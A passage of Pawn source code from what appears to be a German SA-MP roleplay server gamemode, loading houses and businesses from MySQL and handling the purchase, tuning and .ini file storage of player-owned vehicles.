//	    print(string2);

    	if(HouseInfo[idx][hCreated] == 1)
		{
        	if(HouseInfo[idx][hOwned] == 0)
			{
	     		HouseInfo[idx][hPickup] = AddStaticPickup(1273, 1, HouseInfo[idx][hEntrancex], HouseInfo[idx][hEntrancey], HouseInfo[idx][hEntrancez],-1);
    		 	format(string, sizeof(string), "==== [HausID: %d] ====\nBesitzer: %s\nBeschreibung: %s\nPreis: %d$\nMiete: %d$\n/buyhouse zum kaufen",idx,HouseInfo[idx][hOwner],HouseInfo[idx][hDiscription],HouseInfo[idx][hValue],HouseInfo[idx][hRent]);
     			HouseInfo[idx][h_text] = Create3DTextLabel(string,0x0091FFFF,HouseInfo[idx][hEntrancex], HouseInfo[idx][hEntrancey], HouseInfo[idx][hEntrancez],18.0,0,0);
	  			pickups++;
	        }
	        if(HouseInfo[idx][hOwned] == 1)
			{
		        HouseInfo[idx][hPickup] = AddStaticPickup(1239, 1, HouseInfo[idx][hEntrancex], HouseInfo[idx][hEntrancey], HouseInfo[idx][hEntrancez],-1);
		 	    format(string, sizeof(string), "==== [HausID: %d] ====\nBesitzer: %s\nBeschreibung: %s\nPreis: %d$\nMiete: %d$\nEinmieten mit /renthouse",idx,HouseInfo[idx][hOwner],HouseInfo[idx][hDiscription],HouseInfo[idx][hValue],HouseInfo[idx][hRent]);
		    	HouseInfo[idx][h_text] = Create3DTextLabel(string,0x0091FFFF,HouseInfo[idx][hEntrancex], HouseInfo[idx][hEntrancey], HouseInfo[idx][hEntrancez],18.0,0,0);
				pickups++;
			}
		}
	}
}
public LoadBizz()
{
    new query[128];
    for(new idx=0; idx<sizeof(BizzInfo); idx++)
    {
	    format(query, sizeof(query), "SELECT * FROM `bizz` WHERE `id`='%i'", idx);
//	    mysql_function_query(mysqlcon,query, true, "LoadMysqlBizz", "i",idx);
        mysql_pquery(mysqlcon, query, "LoadMysqlBizz", "i",idx);


//	    print("[ERFOLGREICH]: Geschäfte geladen...");
	}
	return 1;
}
forward LoadMysqlBizz(idx);
public LoadMysqlBizz(idx)
{
	new rows,string[128];
//	cache_get_data(rows,fields);
    cache_get_row_count(rows);
	if(rows)
	{
	/*
	    cache_get_field_content(0,"btyp",temp), BizzInfo[idx][bTyp] = strval(temp);
	    cache_get_field_content(0,"bcreated",temp), BizzInfo[idx][bCreated] = strval(temp);
	    cache_get_field_content(0,"bowned",temp), BizzInfo[idx][bOwned] = strval(temp);
	    cache_get_field_content(0,"bowner",temp), BizzInfo[idx][bOwner] = temp;
	    cache_get_field_content(0,"bmessage",temp), BizzInfo[idx][bMessage] = temp;
	    cache_get_field_content(0,"bextortion",temp), BizzInfo[idx][bExtortion] = temp;
	    cache_get_field_content(0,"bentrancex",temp), BizzInfo[idx][bEntranceX] = floatstr(temp);
	    cache_get_field_content(0,"bentrancey",temp), BizzInfo[idx][bEntranceY] = floatstr(temp);
	    cache_get_field_content(0,"bentrancez",temp), BizzInfo[idx][bEntranceZ] = floatstr(temp);
	    cache_get_field_content(0,"bexitx",temp), BizzInfo[idx][bExitX] = floatstr(temp);
	    cache_get_field_content(0,"bexity",temp), BizzInfo[idx][bExitY] = floatstr(temp);
	    cache_get_field_content(0,"bexitz",temp), BizzInfo[idx][bExitZ] = floatstr(temp);
	    cache_get_field_content(0,"blevelneeded",temp), BizzInfo[idx][bLevelNeeded] = strval(temp);
	    cache_get_field_content(0,"bbuyprice",temp), BizzInfo[idx][bBuyPrice] = strval(temp);
	    cache_get_field_content(0,"bentrancecost",temp), BizzInfo[idx][bEntranceCost] = strval(temp);
	    cache_get_field_content(0,"btill",temp), BizzInfo[idx][bTill] = strval(temp);
	    cache_get_field_content(0,"blocked",temp), BizzInfo[idx][bLocked] = strval(temp);
	    cache_get_field_content(0,"binterior",temp), BizzInfo[idx][bInterior] = strval(temp);
	    cache_get_field_content(0,"bproducts",temp), BizzInfo[idx][bProducts] = strval(temp);
	    cache_get_field_content(0,"bmaxproducts",temp), BizzInfo[idx][bMaxProducts] = strval(temp);
	    cache_get_field_content(0,"bdate",temp), BizzInfo[idx][bDate] = strval(temp);*/



        cache_get_value_name_int(0, "btyp", BizzInfo[idx][bTyp]);
        cache_get_value_name_int(0, "bcreated", BizzInfo[idx][bCreated]);
        cache_get_value_name_int(0, "bowned", BizzInfo[idx][bOwned]);



        cache_get_value_name(0, "bowner", BizzInfo[idx][bOwner], MAX_PLAYER_NAME);
        cache_get_value_name(0, "bmessage", BizzInfo[idx][bMessage], MAX_PLAYER_NAME);  // bMessage Länge?
        cache_get_value_name(0, "bextortion", BizzInfo[idx][bExtortion], MAX_PLAYER_NAME); //


        cache_get_value_name_float(0, "bentrancex", BizzInfo[idx][bEntranceX]);
       	cache_get_value_name_float(0, "bentrancey", BizzInfo[idx][bEntranceY]);
       	cache_get_value_name_float(0, "bentrancez", BizzInfo[idx][bEntranceZ]);
       	cache_get_value_name_float(0, "bexitx", BizzInfo[idx][bExitX]);
       	cache_get_value_name_float(0, "bexity", BizzInfo[idx][bExitY]);
       	cache_get_value_name_float(0, "bexitz", BizzInfo[idx][bExitZ]);

       	cache_get_value_name_int(0, "blevelneeded", BizzInfo[idx][bLevelNeeded]);
       	cache_get_value_name_int(0, "bbuyprice", BizzInfo[idx][bBuyPrice]);
       	cache_get_value_name_int(0, "bentrancecost", BizzInfo[idx][bEntranceCost]);
       	cache_get_value_name_int(0, "btill", BizzInfo[idx][bTill]);
       	cache_get_value_name_int(0, "blocked", BizzInfo[idx][bLocked]);
       	cache_get_value_name_int(0, "binterior", BizzInfo[idx][bInterior]);
       	cache_get_value_name_int(0, "bproducts", BizzInfo[idx][bProducts]);
       	cache_get_value_name_int(0, "bmaxproducts", BizzInfo[idx][bMaxProducts]);





		cache_get_value_name_int(0, "bdate", BizzInfo[idx][bDate]);






//	    cache_get_field_content(0,"brobx",temp), BizzInfo[idx][bRobx] = floatstr(temp);
//	    cache_get_field_content(0,"broby",temp), BizzInfo[idx][bRoby] = floatstr(temp);
//	    cache_get_field_content(0,"brobz",temp), BizzInfo[idx][bRobz] = floatstr(temp);

//	    cache_get_field_content(0,"brobmarker",temp), BizzInfo[idx][bRobMarker] = strval(temp);

    	if(BizzInfo[idx][bCreated] == 1)
		{
	        if(BizzInfo[idx][bOwned] == 0)
			{
	     	    BizzInfo[idx][bPickup] = AddStaticPickup(1239, 1, BizzInfo[idx][bEntranceX], BizzInfo[idx][bEntranceY], BizzInfo[idx][bEntranceZ],-1);
	  			pickups++;
	        }
	        if(BizzInfo[idx][bOwned] == 1)
			{
	     	    BizzInfo[idx][bPickup] = AddStaticPickup(1239, 1, BizzInfo[idx][bEntranceX], BizzInfo[idx][bEntranceY], BizzInfo[idx][bEntranceZ],-1);
				pickups++;
			}
			format(string, sizeof(string), "==== [Bizz ID: %d] ====\nName: %s\nBesitzer: %s\nErpresser: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",idx,BizzInfo[idx][bMessage],BizzInfo[idx][bOwner],BizzInfo[idx][bExtortion],BizzInfo[idx][bBuyPrice],BizzInfo[idx][bEntranceCost],BizzInfo[idx][bProducts],BizzInfo[idx][bMaxProducts]);
			BizzInfo[idx][B_text] = Create3DTextLabel(string,0x0091FFFF,BizzInfo[idx][bEntranceX], BizzInfo[idx][bEntranceY], BizzInfo[idx][bEntranceZ],18.0,0,0);
		}
	}
}
public LoadSBizz()
{
    new query[128];
    for(new idx=0; idx<sizeof(SBizzInfo); idx++)
    {
	    format(query, sizeof(query), "SELECT * FROM `sbizz` WHERE `sid`='%i'", idx);
	   // mysql_function_query(mysqlcon,query, true, "LoadMysqlSBizz", "i",idx);

	   mysql_pquery(mysqlcon, query, "LoadMysqlSBizz", "i",idx);
//	    print("[ERFOLGREICH]: sGeschäfte geladen...");
	}
	return 1;
}
forward LoadMysqlSBizz(idx);
public LoadMysqlSBizz(idx)
{
	new rows,string[128];
//	cache_get_data(rows,fields);
    cache_get_row_count(rows);
	if(rows)
	{/*
	    cache_get_field_content(0,"sbcreated",temp), SBizzInfo[idx][sbCreated] = strval(temp);
	    cache_get_field_content(0,"sbowned",temp), SBizzInfo[idx][sbOwned] = strval(temp);
	    cache_get_field_content(0,"sbowner",temp), SBizzInfo[idx][sbOwner] = temp;
	    cache_get_field_content(0,"sbmessage",temp), SBizzInfo[idx][sbMessage] = temp;
	    cache_get_field_content(0,"sbextortion",temp), SBizzInfo[idx][sbExtortion] = temp;

	    cache_get_field_content(0,"sbentrancex",temp), SBizzInfo[idx][sbEntranceX] = floatstr(temp);
	    cache_get_field_content(0,"sbentrancey",temp), SBizzInfo[idx][sbEntranceY] = floatstr(temp);
	    cache_get_field_content(0,"sbentrancez",temp), SBizzInfo[idx][sbEntranceZ] = floatstr(temp);

	    cache_get_field_content(0,"sblevelneeded",temp), SBizzInfo[idx][sbLevelNeeded] = strval(temp);
	    cache_get_field_content(0,"sbbuyprice",temp), SBizzInfo[idx][sbBuyPrice] = strval(temp);
	    cache_get_field_content(0,"sbentrancecost",temp), SBizzInfo[idx][sbEntranceCost] = strval(temp);
	    cache_get_field_content(0,"sbtill",temp), SBizzInfo[idx][sbTill] = strval(temp);
	    cache_get_field_content(0,"sblocked",temp), SBizzInfo[idx][sbLocked] = strval(temp);
	    cache_get_field_content(0,"sbinterior",temp), SBizzInfo[idx][sbInterior] = strval(temp);
	    cache_get_field_content(0,"sbproducts",temp), SBizzInfo[idx][sbProducts] = strval(temp);
	    cache_get_field_content(0,"sbmaxproducts",temp), SBizzInfo[idx][sbMaxProducts] = strval(temp);
	    cache_get_field_content(0,"sbdate",temp), SBizzInfo[idx][sbDate] = strval(temp);*/


     	cache_get_value_name_int(0, "sbcreated", SBizzInfo[idx][sbCreated]);
     	cache_get_value_name_int(0, "sbowned", SBizzInfo[idx][sbOwned]);
     	cache_get_value_name(0, "sbowner", SBizzInfo[idx][sbOwner], MAX_PLAYER_NAME);

    	cache_get_value_name(0, "sbmessage", SBizzInfo[idx][sbMessage], 128);

        cache_get_value_name(0, "bowner", SBizzInfo[idx][sbOwner], 128);
        cache_get_value_name(0, "bmessage", SBizzInfo[idx][sbMessage], 128);  // bMessage Länge?
      //  cache_get_value_name(0, "bextortion", SBizzInfo[idx][bExtortion], 128); //
        cache_get_value_name(0, "sbextortion", SBizzInfo[idx][sbExtortion], 128);



        cache_get_value_name_float(0, "sbentrancex", SBizzInfo[idx][sbEntranceX]);
        cache_get_value_name_float(0, "sbentrancey", SBizzInfo[idx][sbEntranceY]);
        cache_get_value_name_float(0, "sbentrancez", SBizzInfo[idx][sbEntranceZ]);

        cache_get_value_name_int(0, "sblevelneeded", SBizzInfo[idx][sbLevelNeeded]);
        cache_get_value_name_int(0, "sbbuyprice", SBizzInfo[idx][sbBuyPrice]);
        cache_get_value_name_int(0, "sbentrancecost", SBizzInfo[idx][sbEntranceCost]);
        cache_get_value_name_int(0, "sbtill", SBizzInfo[idx][sbTill]);
        cache_get_value_name_int(0, "sblocked", SBizzInfo[idx][sbLocked]);
        cache_get_value_name_int(0, "sbinterior", SBizzInfo[idx][sbInterior]);
        cache_get_value_name_int(0, "sbproducts", SBizzInfo[idx][sbProducts]);
        cache_get_value_name_int(0, "sbmaxproducts", SBizzInfo[idx][sbMaxProducts]);

        cache_get_value_name_int(0, "sbdate", SBizzInfo[idx][sbDate]);

    	if(SBizzInfo[idx][sbCreated] == 1)
		{
	        if(SBizzInfo[idx][sbOwned] == 0)
	        {
	     		AddStaticPickup(1239, 1, SBizzInfo[idx][sbEntranceX], SBizzInfo[idx][sbEntranceY], SBizzInfo[idx][sbEntranceZ],-1);
	  			pickups++;
	        }
	        if(SBizzInfo[idx][sbOwned] == 1)
	        {
		        AddStaticPickup(1239, 1, SBizzInfo[idx][sbEntranceX], SBizzInfo[idx][sbEntranceY], SBizzInfo[idx][sbEntranceZ],-1);
				pickups++;
			}
			format(string, sizeof(string), "==== [sBizz ID: %d] ====\nName: %s\nBesitzer: %s\nPreis: %d$\nEintritt: %d$\nProdukte: %d / %d",idx,SBizzInfo[idx][sbMessage],SBizzInfo[idx][sbOwner],SBizzInfo[idx][sbBuyPrice],SBizzInfo[idx][sbEntranceCost],SBizzInfo[idx][sbProducts],SBizzInfo[idx][sbMaxProducts]);
			SBizzInfo[idx][sB_text] = Create3DTextLabel(string,0x0091FFFF,SBizzInfo[idx][sbEntranceX], SBizzInfo[idx][sbEntranceY], SBizzInfo[idx][sbEntranceZ],18.0,0,0);
		}
	}
}

forward GetDtCarOwnerSlot(playerid,veh);
public GetDtCarOwnerSlot(playerid,veh)
{
    for(new x = 0; x < MaxVeh; x++)
    {
        if(PlayerCar[playerid][x][CarId] == veh){return x;}
    }
    return 555;
}

forward GetDtCarOwner(veh);
public GetDtCarOwner(veh)
{
    for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++) // note that we assign the return value to a new variable (j) to avoid calling the function with each iteration
    {
		if(IsPlayerConnected(i))
		{
	        for(new X = 0; X < MaxVeh; X++)
	        {
			    if(Dtc_PlayerHaveCar[i][X])
				{
		            if(PlayerCar[i][X][CarId] == veh)
					{
					return i;
					}
	  		    }
	        }
	    }
    }
    return 1;
}
Function fCarTuning(fc)
{
	if(FactionCars[fc][fTuning][1] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][1]); }
	if(FactionCars[fc][fTuning][2] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][2]); }
	if(FactionCars[fc][fTuning][3] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][3]); }
	if(FactionCars[fc][fTuning][4] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][4]); }
	if(FactionCars[fc][fTuning][5] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][5]); }
	if(FactionCars[fc][fTuning][6] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][6]); }
	if(FactionCars[fc][fTuning][7] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][7]); }
	if(FactionCars[fc][fTuning][8] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][8]); }
	if(FactionCars[fc][fTuning][9] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][9]); }
	if(FactionCars[fc][fTuning][10] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][10]); }
	if(FactionCars[fc][fTuning][11] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][11]); }
    if(FactionCars[fc][fTuning][12] != 0) { AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][12]); }
	if(FactionCars[fc][fTuning][13] != 0){AddVehicleComponent(FactionCars[fc][fCarid],FactionCars[fc][fTuning][13]);}
}
Function CarTuning(playerid,slot)
{
	if(PlayerCar[playerid][slot][CarPJ] <= 5) {ChangeVehiclePaintjob(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarPJ]);}
	if(PlayerCar[playerid][slot][CarNitro] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarNitro]);}
	if(PlayerCar[playerid][slot][CarHyd] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarHyd]);}
	if(PlayerCar[playerid][slot][CarWheel] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarWheel]);}
	if(PlayerCar[playerid][slot][CarAusp] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarAusp]);}
	if(PlayerCar[playerid][slot][CarSideL] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarSideL]);}
	if(PlayerCar[playerid][slot][CarSideR] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarSideR]);}
	if(PlayerCar[playerid][slot][CarFB] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarFB]);}
	if(PlayerCar[playerid][slot][CarRB] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarRB]);}
	if(PlayerCar[playerid][slot][CarSpoiler] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarSpoiler]);}
	if(PlayerCar[playerid][slot][CarRoof] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarRoof]);}
	if(PlayerCar[playerid][slot][CarHood] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarHood]);}
	if(PlayerCar[playerid][slot][CarVents] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarVents]);}
	if(PlayerCar[playerid][slot][CarLamps] != 0) {AddVehicleComponent(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarLamps]);}


	// Testweise
	/*
	new name[MAX_PLAYER_NAME], strings[128],str[128];
	GetPlayerName(playerid, name, sizeof name);
	format(str, sizeof str, "/Autos/%s%d.ini", name,Dtc_PlayerKey[playerid]);
	format(strings, sizeof(strings), "%s", dini_Get(str, "Plate"));
	SetVehicleNumberPlate(PlayerCar[playerid][Slot][CarId], strings);  // hurensohn skrupy.....
	SetVehicleToRespawn(PlayerCar[playerid][Slot][CarId]);

	*/
	//

    ChangeVehicleColor(PlayerCar[playerid][slot][CarId],PlayerCar[playerid][slot][CarC1],PlayerCar[playerid][slot][CarC2]);
}
Function OnVehicleSpawn(vehicleid)
{
	for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
    	for(new x = 0; x < MaxVeh; x++)
		{
			if(IsPlayerConnected(playerid) && Dtc_PlayerHaveCar[playerid][x])
			{
				if (vehicleid == PlayerCar[playerid][x][CarId])
				{
					SetTimerEx("CarTuning",700,0,"ii",playerid,x);
				}
			}
		}
	}
	return 1;
}
Function SetParkPlatz(playerid)
{
    if(IsPlayerConnected(playerid) && !Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])
	{
    		new Autohaus = dtc_AutohausCat[playerid];
			PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_x] = DtcParkPlatz[Autohaus][RadZahl[Autohaus]][0];
			PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_y] = DtcParkPlatz[Autohaus][RadZahl[Autohaus]][1];
			PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_z] = DtcParkPlatz[Autohaus][RadZahl[Autohaus]][2];
			PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarRotate] = DtcParkPlatz[Autohaus][RadZahl[Autohaus]][3];
	        RadZahl[Autohaus] += 1;
	        if(RadZahl[Autohaus] >= MAXPARKPLATZE)
	        {
	            RadZahl[Autohaus] = 0;
	        }
	}
}
Function OnPlayerBuyCar(playerid,Model,Preis)
{
	if(IsPlayerConnected(playerid) && !Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])
	{
		FraktionsKasse[6] += Preis;// Regierung
        GivePlayerMoneySave(playerid, -Preis);
		SetParkPlatz(playerid);
	    new name[MAX_PLAYER_NAME], str[128], plate[8];
	    GetPlayerName(playerid, name, sizeof name);





		if(strlen(name) > 8)
		{
			strmid(plate, name, 0, 8);
		}
		else
		{
			format(plate, sizeof(plate), "%s", name);
		}



/*
		if(strlen(name) > 8)//8
		{
			strmid(plate, name, 0, 8);
		}
		else
		{
			format(plate, sizeof(plate), "%s", name);
		}
*/
	    format(str, sizeof str, "/Autos/%s%d.ini", name,Dtc_PlayerKey[playerid]);
	    new File: hFile = fopen(str, io_write);
		if (hFile)
		{
		    new var[32];
		    format(var, 32, "CarId=0\n");fwrite(hFile, var);
		    format(var, 32, "CarModel=%d\n",Model);fwrite(hFile, var);
		    format(var, 32, "CarPos_x=%.3f\n",PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_x]);fwrite(hFile, var);
			format(var, 32, "CarPos_y=%.3f\n",PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_y]);fwrite(hFile, var);
			format(var, 32, "CarPos_z=%.3f\n",PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarPos_z]);fwrite(hFile, var);
			format(var, 32, "CarRotate=%.3f\n",PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarRotate]);fwrite(hFile, var);
			format(var, 32, "CarNitro=0\n");fwrite(hFile, var);
			format(var, 32, "CarHyd=0\n");fwrite(hFile, var);
			format(var, 32, "Kilometer=0\n");fwrite(hFile, var);
			new gas;
			gas = GetGasMax(Model);
			format(var, 32, "Benzin=%d\n",gas);fwrite(hFile, var);
			format(var, 32, "CarWheel=0\n");fwrite(hFile, var);
			format(var, 32, "CarAusp=0\n");fwrite(hFile, var);
			format(var, 32, "CarSideL=0\n");fwrite(hFile, var);
			format(var, 32, "CarSideR=0\n");fwrite(hFile, var);
			format(var, 32, "CarFB=0\n");fwrite(hFile, var);
			format(var, 32, "CarRB=0\n");fwrite(hFile, var);
			format(var, 32, "CarSpoiler=0\n");fwrite(hFile, var);
			format(var, 32, "CarRoof=0\n");fwrite(hFile, var);
			format(var, 32, "CarHood=0\n");fwrite(hFile, var);
			format(var, 32, "CarVents=0\n");fwrite(hFile, var);
			format(var, 32, "CarLamps=0\n");fwrite(hFile, var);
			format(var, 32, "CarPJ=6\n");fwrite(hFile, var);
			format(var, 32, "CarC1=1\n");fwrite(hFile, var);
			format(var, 32, "CarC2=1\n");fwrite(hFile, var);
			format(var, 32, "Preis=%d\n",Preis);fwrite(hFile, var);
			format(var, 32, "Plate=%s\n", plate);fwrite(hFile, var);
			format(var, 32, "Neon=0\n");fwrite(hFile, var);
			format(var, 32, "Abgeschleppt=0\n");fwrite(hFile, var);
			format(var, 32, "LPG=0\n");fwrite(hFile, var);
			// Kofferaumsystem
			format(var, 32, "CarDrogen=0\n");fwrite(hFile, var);
			format(var, 32, "CarMats=0\n");fwrite(hFile, var);
			format(var, 32, "CarDeagle=0\n");fwrite(hFile, var);
			format(var, 32, "CarShotgun=0\n");fwrite(hFile, var);
			format(var, 32, "CarMP5=0\n");fwrite(hFile, var);
			format(var, 32, "CarAk47=0\n");fwrite(hFile, var);
			format(var, 32, "CarM4=0\n");fwrite(hFile, var);
			format(var, 32, "CarRifle=0\n");fwrite(hFile, var);
			format(var, 32, "CarSniper=0\n");fwrite(hFile, var);
			format(var, 32, "CarGivekey=Niemand\n");fwrite(hFile, var);
			new Year, Month, Day;
			getdate(Year, Month, Day);
			format(var, 32, "CarBuyedDay=%d\n",Day);fwrite(hFile, var);
			format(var, 32, "CarBuyedMonth=%d\n",Month);fwrite(hFile, var);
			format(var, 32, "CarBuyedYear=%d\n",Year);fwrite(hFile, var);
			format(var, 32, "CarTurbo=0\n");fwrite(hFile, var);
			format(var, 32, "SoundSystem=0\n");fwrite(hFile, var);
			format(var, 32, "SoundSystemData=0\n");fwrite(hFile, var);
			if(Model == 607)
			{

				if(WohnwagenID[playerid] != 0)
				{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast bereits einen Wohnwagen!");
				return 1;
				}
				else
				{
					format(var, 32, "IsWohnwagen=1\n");fwrite(hFile, var);
				}

			}
			else
			{
				format(var, 32, "IsWohnwagen=0\n");fwrite(hFile, var);
			}
			fclose(hFile);
		}
		OnPlayerCarLogin(playerid);
	}
	return 1;
}
Function OnPlayerCarLogin(playerid)
{
	for(new x = 0; x < MaxVeh; x++)
	{
	    if(!Dtc_PlayerHaveCar[playerid][x])
		{
		    new string2[128];
			new playername2[MAX_PLAYER_NAME];
		    GetPlayerName(playerid, playername2, sizeof(playername2));
			format(string2, sizeof(string2), "/Autos/%s%d.ini", playername2,x);
			new File: UserFile = fopen(string2, io_read);
			if (UserFile)
			{
			    Dtc_PlayerHaveCar[playerid][x] = 1;
				new key[ 256 ] , val[ 256 ];
				new Data[ 256 ];
				while ( fread( UserFile , Data , sizeof( Data ) ) )
				{
					key = ini_GetKey( Data );
					if( strcmp( key , "CarId" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarId] = strval( val ); }
				   	if( strcmp( key , "CarModel" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarModel] = strval( val ); }
				   	if( strcmp( key , "CarPos_x" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarPos_x] = floatstr( val ); }
					if( strcmp( key , "CarPos_y" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarPos_y] = floatstr( val ); }
					if( strcmp( key , "CarPos_z" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarPos_z] = floatstr( val ); }
					if( strcmp( key , "CarRotate" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarRotate] = floatstr( val ); }
					if( strcmp( key , "CarNitro" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarNitro] = strval( val ); }
					if( strcmp( key , "CarHyd" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarHyd] = strval( val ); }
					if( strcmp( key , "Kilometer" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][Kilometer] = strval( val ); }
					if( strcmp( key , "Benzin" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][Benzin] = strval( val ); }
					if( strcmp( key , "CarWheel" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarWheel] = strval( val ); }
					if( strcmp( key , "CarAusp" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarAusp] = strval( val ); }
					if( strcmp( key , "CarSideL" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarSideL] = strval( val ); }
					if( strcmp( key , "CarSideR" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarSideR] = strval( val ); }
					if( strcmp( key , "CarFB" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarFB] = strval( val ); }
					if( strcmp( key , "CarRB" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarRB] = strval( val ); }
					if( strcmp( key , "CarSpoiler" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarSpoiler] = strval( val ); }
					if( strcmp( key , "CarRoof" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarRoof] = strval( val ); }
					if( strcmp( key , "CarHood" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarHood] = strval( val ); }
					if( strcmp( key , "CarVents" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarVents] = strval( val ); }
				 	if( strcmp( key , "CarLamps" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarLamps] = strval( val ); }
					if( strcmp( key , "CarPJ" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarPJ] = strval( val ); }
					if( strcmp( key , "CarC1" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarC1] = strval( val ); }
					if( strcmp( key , "CarC2" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarC2] = strval( val ); }
					if( strcmp( key , "Preis" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarPreis] = strval( val ); }
					if( strcmp( key , "Plate" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][Plate] = strval( val ); }
					if( strcmp( key , "Neon" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][Neon] = strval( val ); }
					if( strcmp( key , "Abgeschleppt" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][Abgeschleppt] = strval( val ); }
					if( strcmp( key , "LPG" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][LPG] = strval( val ); }
					//Kofferaumsystem
					if( strcmp( key , "CarDrogen" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarDrogen] = strval( val ); }
					if( strcmp( key , "CarMats" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarMats] = strval( val ); }
					if( strcmp( key , "CarDeagle" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarDeagle] = strval( val ); }
					if( strcmp( key , "CarShotgun" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarShotgun] = strval( val ); }
					if( strcmp( key , "CarMP5" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarMP5] = strval( val ); }
					if( strcmp( key , "CarAk47" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarAk47] = strval( val ); }
					if( strcmp( key , "CarM4" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarM4] = strval( val ); }
					if( strcmp( key , "CarRifle" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarRifle] = strval( val ); }
					if( strcmp( key , "CarSniper" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarSniper] = strval( val ); }
					if( strcmp( key , "CarGivekey" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarGivekey] = strval( val ); }
